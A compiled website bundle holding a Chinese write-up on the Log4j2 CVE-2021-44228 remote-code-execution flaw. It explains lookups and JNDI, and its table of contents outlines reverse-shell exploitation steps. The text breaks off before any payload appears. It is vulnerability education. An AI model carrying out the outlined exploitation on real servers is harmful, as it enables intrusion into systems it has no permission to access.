"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[7494],{3905:(e,t,l)=>{l.d(t,{Zo:()=>s,kt:()=>c});var a=l(7294);function n(e,t,l){return t in e?Object.defineProperty(e,t,{value:l,enumerable:!0,configurable:!0,writable:!0}):e[t]=l,e}function r(e,t){var l=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),l.push.apply(l,a)}return l}function o(e){for(var t=1;t<arguments.length;t++){var l=null!=arguments[t]?arguments[t]:{};t%2?r(Object(l),!0).forEach((function(t){n(e,t,l[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(l)):r(Object(l)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(l,t))}))}return e}function p(e,t){if(null==e)return{};var l,a,n=function(e,t){if(null==e)return{};var l,a,n={},r=Object.keys(e);for(a=0;a<r.length;a++)l=r[a],t.indexOf(l)>=0||(n[l]=e[l]);return n}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)l=r[a],t.indexOf(l)>=0||Object.prototype.propertyIsEnumerable.call(e,l)&&(n[l]=e[l])}return n}var i=a.createContext({}),k=function(e){var t=a.useContext(i),l=t;return e&&(l="function"==typeof e?e(t):o(o({},t),e)),l},s=function(e){var t=k(e.components);return a.createElement(i.Provider,{value:t},e.children)},u="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},m=a.forwardRef((function(e,t){var l=e.components,n=e.mdxType,r=e.originalType,i=e.parentName,s=p(e,["components","mdxType","originalType","parentName"]),u=k(l),m=n,c=u["".concat(i,".").concat(m)]||u[m]||d[m]||r;return l?a.createElement(c,o(o({ref:t},s),{},{components:l})):a.createElement(c,o({ref:t},s))}));function c(e,t){var l=arguments,n=t&&t.mdxType;if("string"==typeof e||n){var r=l.length,o=new Array(r);o[0]=m;var p={};for(var i in t)hasOwnProperty.call(t,i)&&(p[i]=t[i]);p.originalType=e,p[u]="string"==typeof e?e:n,o[1]=p;for(var k=2;k<r;k++)o[k]=l[k];return a.createElement.apply(null,o)}return a.createElement.apply(null,l)}m.displayName="MDXCreateElement"},1557:(e,t,l)=>{l.r(t),l.d(t,{assets:()=>i,contentTitle:()=>o,default:()=>d,frontMatter:()=>r,metadata:()=>p,toc:()=>k});var a=l(7462),n=(l(7294),l(3905));const r={},o=void 0,p={unversionedId:"\u6f0f\u6d1e\u590d\u73b0/log4j2\u539f\u7406\u5206\u6790\u53ca\u6f0f\u6d1e\u590d\u73b01",id:"\u6f0f\u6d1e\u590d\u73b0/log4j2\u539f\u7406\u5206\u6790\u53ca\u6f0f\u6d1e\u590d\u73b01",title:"log4j2\u539f\u7406\u5206\u6790\u53ca\u6f0f\u6d1e\u590d\u73b01",description:"[TOC]",source:"@site/docs/\u6f0f\u6d1e\u590d\u73b0/log4j2\u539f\u7406\u5206\u6790\u53ca\u6f0f\u6d1e\u590d\u73b01.md",sourceDirName:"\u6f0f\u6d1e\u590d\u73b0",slug:"/\u6f0f\u6d1e\u590d\u73b0/log4j2\u539f\u7406\u5206\u6790\u53ca\u6f0f\u6d1e\u590d\u73b01",permalink:"/docs/\u6f0f\u6d1e\u590d\u73b0/log4j2\u539f\u7406\u5206\u6790\u53ca\u6f0f\u6d1e\u590d\u73b01",draft:!1,editUrl:"https://github.com/Adm8n/Adm8n.github.io/tree/gh-pages/docs/\u6f0f\u6d1e\u590d\u73b0/log4j2\u539f\u7406\u5206\u6790\u53ca\u6f0f\u6d1e\u590d\u73b01.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"WinRAR 0day\u6f0f\u6d1eCVE-2023-38831\u590d\u73b0\u6700\u8be6\u89e3",permalink:"/docs/\u6f0f\u6d1e\u590d\u73b0/WinRAR 0day\u6f0f\u6d1eCVE-2023-38831\u590d\u73b0\u6700\u8be6\u89e3"},next:{title:"log4j2\u6f0f\u6d1e\u590d\u73b02",permalink:"/docs/\u6f0f\u6d1e\u590d\u73b0/log4j2\u6f0f\u6d1e\u590d\u73b02"}},i={},k=[{value:"0x01 log4j2\u7b80\u4ecb",id:"0x01-log4j2\u7b80\u4ecb",level:4},{value:"<strong>Log4j2 \u7279\u70b9</strong>",id:"log4j2-\u7279\u70b9",level:5},{value:"<strong>Log4j2\u7ec4\u4ef6\u7684\u5e94\u7528</strong>",id:"log4j2\u7ec4\u4ef6\u7684\u5e94\u7528",level:5},{value:"0x02 CVE-2021-44228",id:"0x02-cve-2021-44228",level:4},{value:"<strong>\u6f0f\u6d1e\u7b80\u4ecb\uff1a</strong>",id:"\u6f0f\u6d1e\u7b80\u4ecb",level:5},{value:"<strong>\u6f0f\u6d1e\u9002\u7528\u7248\u672c</strong>",id:"\u6f0f\u6d1e\u9002\u7528\u7248\u672c",level:5},{value:"<strong>\u6f0f\u6d1e\u539f\u7406</strong>",id:"\u6f0f\u6d1e\u539f\u7406",level:5},{value:"<strong>lookup\u529f\u80fd</strong>",id:"lookup\u529f\u80fd",level:6},{value:"<strong>jndi\u89e3\u6790\u5668</strong>",id:"jndi\u89e3\u6790\u5668",level:6},{value:"<strong>jndi\u662f\u4ec0\u4e48</strong>",id:"jndi\u662f\u4ec0\u4e48",level:6},{value:"<strong>ldap\u670d\u52a1</strong>",id:"ldap\u670d\u52a1",level:6},{value:"RMI",id:"rmi",level:6},{value:"0x03\u653b\u51fb\u8fc7\u7a0b",id:"0x03\u653b\u51fb\u8fc7\u7a0b",level:4},{value:"0x04\u6f0f\u6d1e\u590d\u73b0",id:"0x04\u6f0f\u6d1e\u590d\u73b0",level:4},{value:"\u6f0f\u6d1e\u73af\u5883",id:"\u6f0f\u6d1e\u73af\u5883",level:5},{value:"1.\u8bbf\u95ee\u9776\u673a",id:"1\u8bbf\u95ee\u9776\u673a",level:5},{value:"2.dns\u56de\u663e\u9a8c\u8bc1",id:"2dns\u56de\u663e\u9a8c\u8bc1",level:5},{value:"3.\u5c06bash\u53cd\u5f39shell\u547d\u4ee4\u7f16\u7801\u5907\u7528",id:"3\u5c06bash\u53cd\u5f39shell\u547d\u4ee4\u7f16\u7801\u5907\u7528",level:5},{value:"4.\u4f7f\u7528JNDIExploit\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528",id:"4\u4f7f\u7528jndiexploit\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528",level:5},{value:"5.\u5728\u653b\u51fb\u673a\u4e2d\u5f00\u542f\u76d1\u542c",id:"5\u5728\u653b\u51fb\u673a\u4e2d\u5f00\u542f\u76d1\u542c",level:5},{value:"6.\u4f7f\u7528payload\u7684\u8fdb\u884c\u653b\u51fb",id:"6\u4f7f\u7528payload\u7684\u8fdb\u884c\u653b\u51fb",level:5},{value:"7.\u67e5\u770b\u56de\u663e",id:"7\u67e5\u770b\u56de\u663e",level:5},{value:"0x05\u6f0f\u6d1e\u4fee\u590d",id:"0x05\u6f0f\u6d1e\u4fee\u590d",level:4}],s={toc:k},u="wrapper";function d(e){let{components:t,...l}=e;return(0,n.kt)(u,(0,a.Z)({},s,l,{components:t,mdxType:"MDXLayout"}),(0,n.kt)("p",null,"[TOC]"),(0,n.kt)("h1",{id:"log4j2\u539f\u7406\u5206\u6790\u53ca\u6f0f\u6d1e\u590d\u73b0"},"log4j2\u539f\u7406\u5206\u6790\u53ca\u6f0f\u6d1e\u590d\u73b0"),(0,n.kt)("h4",{id:"0x01-log4j2\u7b80\u4ecb"},"0x01 log4j2\u7b80\u4ecb"),(0,n.kt)("blockquote",null,(0,n.kt)("p",{parentName:"blockquote"},"Log4j2 \u662f\u4e00\u4e2a\u7528\u4e8e Java \u5e94\u7528\u7a0b\u5e8f\u7684\u6210\u719f\u4e14\u529f\u80fd\u5f3a\u5927\u7684\u65e5\u5fd7\u8bb0\u5f55\u6846\u67b6\u3002\u5b83\u662f Log4j \u7684\u5347\u7ea7\u7248\u672c\uff0c\u76f8\u6bd4\u4e8e Log4j\uff0cLog4j2 \u5728\u6027\u80fd\u3001\u53ef\u9760\u6027\u548c\u7075\u6d3b\u6027\u65b9\u9762\u90fd\u6709\u663e\u8457\u7684\u6539\u8fdb\u3002")),(0,n.kt)("h5",{id:"log4j2-\u7279\u70b9"},(0,n.kt)("strong",{parentName:"h5"},"Log4j2 \u7279\u70b9")),(0,n.kt)("blockquote",null,(0,n.kt)("ol",{parentName:"blockquote"},(0,n.kt)("li",{parentName:"ol"},"\u9ad8\u6027\u80fd\uff1aLog4j2 \u4f7f\u7528\u5f02\u6b65\u65e5\u5fd7\u8bb0\u5f55\u673a\u5236\uff0c\u53ef\u4ee5\u63d0\u4f9b\u6bd4\u4f20\u7edf\u540c\u6b65\u65e5\u5fd7\u8bb0\u5f55\u66f4\u9ad8\u7684\u541e\u5410\u91cf\u548c\u66f4\u4f4e\u7684\u5ef6\u8fdf\uff0c\u56e0\u6b64\u5728\u9ad8\u8d1f\u8f7d\u60c5\u51b5\u4e0b\u4ecd\u7136\u80fd\u591f\u4fdd\u6301\u51fa\u8272\u7684\u6027\u80fd\u3002"),(0,n.kt)("li",{parentName:"ol"},"\u7075\u6d3b\u7684\u914d\u7f6e\uff1aLog4j2 \u7684\u914d\u7f6e\u6587\u4ef6\u4f7f\u7528 XML\u3001JSON \u6216 YAML \u683c\u5f0f\uff0c\u5141\u8bb8\u5c06\u65e5\u5fd7\u7684\u683c\u5f0f\u3001\u76ee\u6807\u4ee5\u53ca\u65e5\u5fd7\u7ea7\u522b\u7b49\u5c5e\u6027\u8fdb\u884c\u7075\u6d3b\u7684\u914d\u7f6e\u548c\u5b9a\u5236\u3002"),(0,n.kt)("li",{parentName:"ol"},"\u591a\u79cd\u8f93\u51fa\u76ee\u6807\uff1aLog4j2 \u652f\u6301\u591a\u79cd\u65e5\u5fd7\u8f93\u51fa\u76ee\u6807\uff0c\u5305\u62ec\u63a7\u5236\u53f0\u3001\u6587\u4ef6\u3001\u6570\u636e\u5e93\u3001\u8fdc\u7a0b\u5957\u63a5\u5b57\u3001JMS \u548c Apache Flume \u7b49\u3002\u4f60\u53ef\u4ee5\u6839\u636e\u9700\u6c42\u914d\u7f6e\u65e5\u5fd7\u8f93\u51fa\u5230\u4e0d\u540c\u7684\u76ee\u6807\u3002"),(0,n.kt)("li",{parentName:"ol"},"\u5f3a\u5927\u7684\u8fc7\u6ee4\u5668\u548c\u8def\u7531\uff1aLog4j2 \u652f\u6301\u8fc7\u6ee4\u5668\u529f\u80fd\uff0c\u53ef\u4ee5\u6839\u636e\u65e5\u5fd7\u7684\u7ea7\u522b\u3001\u6e90\u3001\u7ebf\u7a0b\u7b49\u6761\u4ef6\u8fdb\u884c\u8fc7\u6ee4\uff0c\u5728\u6ee1\u8db3\u6761\u4ef6\u65f6\u51b3\u5b9a\u662f\u5426\u8bb0\u5f55\u65e5\u5fd7\u3002\u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\u57fa\u4e8e\u65e5\u5fd7\u7684\u7279\u5b9a\u5c5e\u6027\u8fdb\u884c\u8def\u7531\uff0c\u5c06\u4e0d\u540c\u7684\u65e5\u5fd7\u8bb0\u5f55\u5230\u4e0d\u540c\u7684\u76ee\u6807\u3002"),(0,n.kt)("li",{parentName:"ol"},"\u6309\u9700\u52a0\u8f7d\u63d2\u4ef6\uff1aLog4j2 \u4f7f\u7528\u63d2\u4ef6\u67b6\u6784\uff0c\u5141\u8bb8\u6309\u9700\u52a0\u8f7d\u5404\u79cd\u9644\u52a0\u7ec4\u4ef6\u548c\u6269\u5c55\u529f\u80fd\uff0c\u5982\u81ea\u5b9a\u4e49\u8f93\u51fa\u76ee\u6807\u3001\u683c\u5f0f\u5668\u3001\u8fc7\u6ee4\u5668\u7b49\u3002\u8fd9\u4f7f\u5f97 Log4j2 \u7684\u529f\u80fd\u53ef\u4ee5\u6839\u636e\u9700\u8981\u8fdb\u884c\u6269\u5c55\u548c\u5b9a\u5236\u3002"),(0,n.kt)("li",{parentName:"ol"},"\u4e0a\u4e0b\u6587\u5bb9\u5668\uff1aLog4j2 \u63d0\u4f9b\u4e86 ThreadContext \u548c ContextMap \u7b49\u4e0a\u4e0b\u6587\u5bb9\u5668\uff0c\u7528\u4e8e\u5728\u591a\u7ebf\u7a0b\u73af\u5883\u4e2d\u8ddf\u8e2a\u548c\u7ba1\u7406\u65e5\u5fd7\u8bb0\u5f55\u3002\u8fd9\u5bf9\u4e8e\u8bc6\u522b\u548c\u8c03\u8bd5\u7279\u5b9a\u7ebf\u7a0b\u7684\u65e5\u5fd7\u975e\u5e38\u6709\u7528\u3002"))),(0,n.kt)("p",null,"\u603b\u4f53\u800c\u8a00\uff0cLog4j2 \u662f\u4e00\u4e2a\u529f\u80fd\u5f3a\u5927\u4e14\u7075\u6d3b\u7684\u65e5\u5fd7\u8bb0\u5f55\u6846\u67b6\uff0c\u65e8\u5728\u63d0\u4f9b\u9ad8\u6027\u80fd\u7684\u65e5\u5fd7\u8bb0\u5f55\u89e3\u51b3\u65b9\u6848\u3002\u5b83\u88ab\u5e7f\u6cdb\u7528\u4e8e\u5404\u79cd Java \u5e94\u7528\u7a0b\u5e8f\u548c\u6846\u67b6\u4e2d\uff0c\u5e2e\u52a9\u5f00\u53d1\u4eba\u5458\u66f4\u597d\u5730\u7ba1\u7406\u548c\u5206\u6790\u5e94\u7528\u7a0b\u5e8f\u7684\u65e5\u5fd7\u4fe1\u606f\u3002"),(0,n.kt)("h5",{id:"log4j2\u7ec4\u4ef6\u7684\u5e94\u7528"},(0,n.kt)("strong",{parentName:"h5"},"Log4j2\u7ec4\u4ef6\u7684\u5e94\u7528")),(0,n.kt)("p",null,"\u4ee5\u4e0b\u662f\u4e00\u4e9b\u4f7f\u7528 Log4j2 \u7ec4\u4ef6\u7684\u4e2d\u95f4\u4ef6\u548c\u5e94\u7528\u7a0b\u5e8f\u7684\u5e38\u89c1\u793a\u4f8b\uff1a"),(0,n.kt)("ol",null,(0,n.kt)("li",{parentName:"ol"},(0,n.kt)("strong",{parentName:"li"},"Apache Tomcat - Java Web \u670d\u52a1\u5668")),(0,n.kt)("li",{parentName:"ol"},"Apache Kafka - \u5206\u5e03\u5f0f\u6d41\u5904\u7406\u5e73\u53f0"),(0,n.kt)("li",{parentName:"ol"},"Apache ActiveMQ - \u5f00\u6e90\u6d88\u606f\u961f\u5217\u7cfb\u7edf"),(0,n.kt)("li",{parentName:"ol"},"Elasticsearch - \u5206\u5e03\u5f0f\u641c\u7d22\u548c\u5206\u6790\u5f15\u64ce"),(0,n.kt)("li",{parentName:"ol"},(0,n.kt)("strong",{parentName:"li"},"Spring Framework - Java \u5f00\u53d1\u6846\u67b6")),(0,n.kt)("li",{parentName:"ol"},"Hibernate ORM - \u5bf9\u8c61\u5173\u7cfb\u6620\u5c04\u6846\u67b6"),(0,n.kt)("li",{parentName:"ol"},"Apache Camel - \u4f01\u4e1a\u96c6\u6210\u6a21\u5f0f\u6846\u67b6"),(0,n.kt)("li",{parentName:"ol"},(0,n.kt)("strong",{parentName:"li"},"Apache Solr - \u5f00\u6e90\u641c\u7d22\u5e73\u53f0")),(0,n.kt)("li",{parentName:"ol"},"Apache Druid - \u5b9e\u65f6\u5206\u6790\u6570\u636e\u5e93"),(0,n.kt)("li",{parentName:"ol"},"Apache NiFi - \u6570\u636e\u6d41\u5904\u7406\u7cfb\u7edf"),(0,n.kt)("li",{parentName:"ol"},(0,n.kt)("strong",{parentName:"li"},"Apache Flink - \u5206\u5e03\u5f0f\u6d41\u5904\u7406\u6846\u67b6")),(0,n.kt)("li",{parentName:"ol"},(0,n.kt)("strong",{parentName:"li"},"Apache Hadoop - \u5206\u5e03\u5f0f\u8ba1\u7b97\u6846\u67b6")),(0,n.kt)("li",{parentName:"ol"},"Apache Spark - \u5206\u5e03\u5f0f\u5927\u6570\u636e\u5904\u7406\u6846\u67b6"),(0,n.kt)("li",{parentName:"ol"},"Apache Storm - \u5b9e\u65f6\u6d41\u5904\u7406\u6846\u67b6"),(0,n.kt)("li",{parentName:"ol"},"Alfresco - \u5f00\u6e90\u4f01\u4e1a\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf"),(0,n.kt)("li",{parentName:"ol"},"Atlassian JIRA - \u9879\u76ee\u7ba1\u7406\u548c\u7f3a\u9677\u8ffd\u8e2a\u5de5\u5177"),(0,n.kt)("li",{parentName:"ol"},(0,n.kt)("strong",{parentName:"li"},"Jenkins - \u6301\u7eed\u96c6\u6210\u548c\u4ea4\u4ed8\u5e73\u53f0")),(0,n.kt)("li",{parentName:"ol"},"SonarQube - \u4ee3\u7801\u8d28\u91cf\u7ba1\u7406\u5e73\u53f0"),(0,n.kt)("li",{parentName:"ol"},"Liferay - \u4f01\u4e1a\u95e8\u6237\u548c\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf"),(0,n.kt)("li",{parentName:"ol"},"Graylog - \u65e5\u5fd7\u7ba1\u7406\u548c\u5206\u6790\u5e73\u53f0")),(0,n.kt)("h4",{id:"0x02-cve-2021-44228"},"0x02 CVE-2021-44228"),(0,n.kt)("h5",{id:"\u6f0f\u6d1e\u7b80\u4ecb"},(0,n.kt)("strong",{parentName:"h5"},"\u6f0f\u6d1e\u7b80\u4ecb\uff1a")),(0,n.kt)("p",null,"Apache Log4j2\u662f\u4e00\u4e2a\u57fa\u4e8eJava\u7684\u65e5\u5fd7\u8bb0\u5f55\u5de5\u5177\uff0c\u5f53\u524d\u88ab\u5e7f\u6cdb\u5e94\u7528\u4e8e\u4e1a\u52a1\u7cfb\u7edf\u5f00\u53d1\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u5229\u7528\u8be5\u5de5\u5177\u5c06\u7a0b\u5e8f\u7684\u8f93\u5165\u8f93\u51fa\u4fe1\u606f\u8fdb\u884c\u65e5\u5fd7\u8bb0\u5f55\u3002"),(0,n.kt)("p",null," 2021\u5e7411\u670824\u65e5\uff0c\u963f\u91cc\u4e91\u5b89\u5168\u56e2\u961f\u5411Apache\u5b98\u65b9\u62a5\u544a\u4e86Apache Log4j2\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u662f\u7531\u4e8eApache Log4j2\u67d0\u4e9b\u529f\u80fd\u5b58\u5728\u9012\u5f52\u89e3\u6790\u529f\u80fd\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u76f4\u63a5\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u89e6\u53d1\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u4ece\u800c\u83b7\u5f97\u76ee\u6807\u670d\u52a1\u5668\u6743\u9650\u3002"),(0,n.kt)("p",null," \u5728java\u4e2d\u6700\u5e38\u7528\u7684\u65e5\u5fd7\u6846\u67b6\u662flog4j2\u548clogback\uff0c\u5176\u4e2dlog4j2\u652f\u6301",(0,n.kt)("strong",{parentName:"p"},"lookup"),"\u529f\u80fd\uff08\u67e5\u627e\u641c\u7d22\uff09\uff0c\u8fd9\u4e5f\u662f\u4e00\u4e2a\u975e\u5e38\u5f3a\u5927\u7684\u529f\u80fd\uff0c\u8bbe\u8ba1\u4e4b\u521d\u7684\u76ee\u7684\u4e5f\u662f\u4e3a\u4e86\u65b9\u4fbf\u5f00\u53d1\u8005\u8c03\u7528"),(0,n.kt)("p",null," \u4f8b\u5982\u5f53\u5f00\u53d1\u8005\u60f3\u5728\u65e5\u5fd7\u4e2d\u6253\u5370\u4eca\u5929\u7684\u65e5\u671f\uff0c\u5219\u53ea\u9700\u8981\u8f93\u51fa${data:MM-dd-yyyy}\uff0c\u6b64\u65f6log4j\u4f1a\u5c06${}\u4e2d\u5305\u88f9\u7684\u5185\u5bb9\u5355\u72ec\u5904\u7406\uff0c\u5c06\u5b83\u8bc6\u522b\u4e3a\u65e5\u671f\u67e5\u627e\uff0c\u7136\u540e\u5c06\u8be5\u8868\u8fbe\u5f0f\u66ff\u6362\u4e3a\u4eca\u5929\u7684\u65e5\u671f\u5185\u5bb9\u8f93\u51fa\u4e3a\u201c08-22-2022\u201d\uff0c\u8fd9\u6837\u505a\u5c31\u4e0d\u9700\u8981\u5f00\u53d1\u8005\u81ea\u5df1\u53bb\u7f16\u5199\u67e5\u627e\u65e5\u671f\u7684\u4ee3\u7801\u3002"),(0,n.kt)("p",null," \u8868\u8fbe\u5f0f\u9664\u4e86\u652f\u6301\u65e5\u671f\uff0c\u8fd8\u652f\u6301\u8f93\u51fa\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\u7b49\u529f\u80fd\uff0c\u8fd9\u6837\u6781\u5927\u7684\u65b9\u4fbf\u4e86\u5f00\u53d1\u8005\u3002\u4f46\u662f\u5b89\u5168\u95ee\u9898\u5f80\u5f80\u5c31\u662f\u56e0\u4e3a\u201c\u56fe\u65b9\u4fbf\u201d\u5f15\u8d77\u7684\uff0c\u6bd5\u7adf\u8bbe\u8ba1\u8005\u4e5f\u662f\u9700\u8981\u5728\u5b89\u5168\u6027\u548c\u7528\u6237\u4f53\u9a8c\u4e4b\u95f4\u505a\u4e2a\u5e73\u8861\u3002"),(0,n.kt)("p",null,"\u5176\u5b9e\u6253\u5370\u65e5\u671f\uff0c\u6253\u5370\u7cfb\u7edf\u53d8\u91cf\u8fd9\u79cd\u5bf9\u7cfb\u7edf\u800c\u8a00\u6784\u4e0d\u6210\u4ec0\u4e48\u5a01\u80c1\uff0c\u6700\u7ec8\u8981\u7684\u539f\u56e0\u662f",(0,n.kt)("strong",{parentName:"p"},"log4j\u8fd8\u652f\u6301JNDI\u534f\u8bae\u3002")),(0,n.kt)("h5",{id:"\u6f0f\u6d1e\u9002\u7528\u7248\u672c"},(0,n.kt)("strong",{parentName:"h5"},"\u6f0f\u6d1e\u9002\u7528\u7248\u672c")),(0,n.kt)("p",null,"2.0 <= Apache log4j2 <= 2.14.1"),(0,n.kt)("h5",{id:"\u6f0f\u6d1e\u539f\u7406"},(0,n.kt)("strong",{parentName:"h5"},"\u6f0f\u6d1e\u539f\u7406")),(0,n.kt)("p",null,"Apache log4j2-RCE \u6f0f\u6d1e\u662f\u7531\u4e8eLog4j2\u63d0\u4f9b\u7684",(0,n.kt)("strong",{parentName:"p"},"lookup\u529f\u80fd\u4e0b\u7684Jndi Lookup"),"\u6a21\u5757\u51fa\u73b0\u95ee\u9898\u6240\u5bfc\u81f4\u7684\uff0c\u8be5\u529f\u80fd\u6a21\u5757\u5728\u8f93\u51fa\u65e5\u5fd7\u4fe1\u606f\u65f6\u5141\u8bb8\u5f00\u53d1\u4eba\u5458\u901a\u8fc7\u76f8\u5e94\u7684\u534f\u8bae\u53bb\u8bf7\u6c42\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u7684\u8d44\u6e90\u3002\u800c\u5f00\u53d1\u4eba\u5458\u5728\u5904\u7406\u6570\u636e\u65f6\uff0c\u5e76\u6ca1\u6709\u5bf9\u7528\u6237\u8f93\u5165\u7684\u4fe1\u606f\u8fdb\u884c\u5224\u65ad\uff0c\u5bfc\u81f4Log4j2\u8bf7\u6c42\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u7684\u542b\u6709\u6076\u610f\u4ee3\u7801\u7684\u8d44\u6e90 \u5e76\u6267\u884c\u5176\u4e2d\u7684\u4ee3\u7801\uff0c\u4ece\u800c\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002"),(0,n.kt)("p",null," log4j\u662f\u4e00\u6b3e\u901a\u7528\u65e5\u5fd7\u8bb0\u5f55\u5de5\u5177\uff0c\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528log4j\u5bf9\u5f53\u524d\u7a0b\u5e8f\u72b6\u6001\u8fdb\u884c\u8bb0\u5f55\u3002log4j\u7684\u529f\u80fd\u975e\u5e38\u5f3a\u5927\uff0c\u5f00\u53d1\u4eba\u5458\u9664\u4e86\u76f4\u63a5\u8bb0\u5f55\u6587\u672c\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u7b80\u5355\u8868\u8fbe\u5f0f\u8bb0\u5f55\u52a8\u6001\u5185\u5bb9\uff0c\u4f8b\u5982\uff1a"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-java"},'logger.info("system propety: ${sys:user.dir}");\n')),(0,n.kt)("h6",{id:"lookup\u529f\u80fd"},(0,n.kt)("strong",{parentName:"h6"},"lookup\u529f\u80fd")),(0,n.kt)("p",null,"Lookup \u662f\u4e00\u79cd\u673a\u5236\uff0c\u7528\u4e8e\u52a8\u6001\u83b7\u53d6\u548c\u66ff\u6362\u65e5\u5fd7\u8bb0\u5f55\u4e2d\u7684\u53d8\u91cf\u6216\u5c5e\u6027\u7684\u503c\u3002\u5b83\u63d0\u4f9b\u4e86\u4e00\u79cd\u7075\u6d3b\u7684\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5728\u65e5\u5fd7\u6d88\u606f\u4e2d\u5f15\u7528\u3001\u89e3\u6790\u548c\u63d2\u5165\u5404\u79cd\u4e0a\u4e0b\u6587\u76f8\u5173\u7684\u4fe1\u606f\u3002"),(0,n.kt)("p",null,"Log4j2 \u5185\u7f6e\u4e86\u591a\u4e2a Lookup \u5b9e\u73b0\uff0c\u6bcf\u4e2a Lookup \u90fd\u6709\u4e0d\u540c\u7684\u7528\u9014\u548c\u529f\u80fd\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684 Lookup \u7c7b\u578b\uff1a"),(0,n.kt)("ol",null,(0,n.kt)("li",{parentName:"ol"},"${date}\uff1a\u83b7\u53d6\u5f53\u524d\u65e5\u671f\u548c\u65f6\u95f4\uff0c\u652f\u6301\u81ea\u5b9a\u4e49\u683c\u5f0f\u3002"),(0,n.kt)("li",{parentName:"ol"},"${pid}\uff1a\u83b7\u53d6\u5f53\u524d\u8fdb\u7a0b\u7684 ID\u3002"),(0,n.kt)("li",{parentName:"ol"},"${logLevel}\uff1a\u83b7\u53d6\u5f53\u524d\u65e5\u5fd7\u8bb0\u5f55\u7684\u7ea7\u522b\u3002"),(0,n.kt)("li",{parentName:"ol"},"${sys:propertyName}\uff1a\u83b7\u53d6\u7cfb\u7edf\u5c5e\u6027\u7684\u503c\uff0c\u4f8b\u5982 ${sys:user.home} \u83b7\u53d6\u7528\u6237\u4e3b\u76ee\u5f55\u3002"),(0,n.kt)("li",{parentName:"ol"},"${env:variableName}\uff1a\u83b7\u53d6\u73af\u5883\u53d8\u91cf\u7684\u503c\uff0c\u4f8b\u5982 ${env:JAVA_HOME} \u83b7\u53d6 Java \u5b89\u88c5\u8def\u5f84\u3002"),(0,n.kt)("li",{parentName:"ol"},"${ctx:key}\uff1a\u83b7\u53d6\u65e5\u5fd7\u7ebf\u7a0b\u4e0a\u4e0b\u6587\uff08ThreadContext\uff09\u4e2d\u6307\u5b9a\u952e\u7684\u503c\u3002"),(0,n.kt)("li",{parentName:"ol"},"${class:fullyQualifiedName:methodName}\uff1a\u83b7\u53d6\u6307\u5b9a\u7c7b\u7684\u9759\u6001\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u3002"),(0,n.kt)("li",{parentName:"ol"},"${mdc:key}\uff1a\u83b7\u53d6 MDC (Mapped Diagnostic Context) \u4e2d\u6307\u5b9a\u952e\u7684\u503c\u3002")),(0,n.kt)("p",null,"\u4f7f\u7528${} \u8fdb\u884c\u5305\u88f9\uff0c\u4e0a\u8ff0\u793a\u4f8b\u4e2d\uff0csys:user.dir \u8868\u793a\u4f7f\u7528sys\u89e3\u6790\u5668\uff0c\u67e5\u627euser.dir\u7684\u5185\u5bb9\uff0c\u5373\u5728\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\u4e2d\u67e5\u627euser.dir\uff0c\u4ee5\u66ff\u6362 ${sys:user.dir} \u8fdb\u884c\u6253\u5370\u3002"),(0,n.kt)("p",null," ",(0,n.kt)("strong",{parentName:"p"},"log4j\u4e2d\u9664\u4e86sys\u89e3\u6790\u5668\u5916\uff0c\u8fd8\u6709\u5f88\u591a\u5176\u4ed6\u7c7b\u578b\u7684\u89e3\u6790\u5668\u3002\u5176\u4e2d\uff0cjndi \u89e3\u6790\u5668\u5c31\u662f\u672c\u6b21\u6f0f\u6d1e\u7684\u6e90\u5934\u3002")),(0,n.kt)("h6",{id:"jndi\u89e3\u6790\u5668"},(0,n.kt)("strong",{parentName:"h6"},"jndi\u89e3\u6790\u5668")),(0,n.kt)("p",null,"jndi \u89e3\u6790\u5668\u5c06\u901a\u8fc7 jdk \u83b7\u53d6 jndi \u5bf9\u8c61\uff0c\u5e76\u4f7f\u7528\u8fd9\u4e2a jndi \u5bf9\u8c61\u66ff\u6362\u539f\u6709\u6587\u672c\u8fdb\u884c\u6253\u5370\u3002 \u6211\u4eec\u5c06 jndi \u5bf9\u8c61\u7406\u89e3\u6210\u4e3a\u4e00\u4e2a\u4ece\u7a0b\u5e8f\u5916\u90e8\u83b7\u53d6\u7684 Java \u7a0b\u5e8f\u5bf9\u8c61\u5c31\u53ef\u4ee5\u4e86\u3002jdk\u4e2d\u63d0\u4f9b\u4e86\u591a\u79cd\u4e0d\u540c jndi 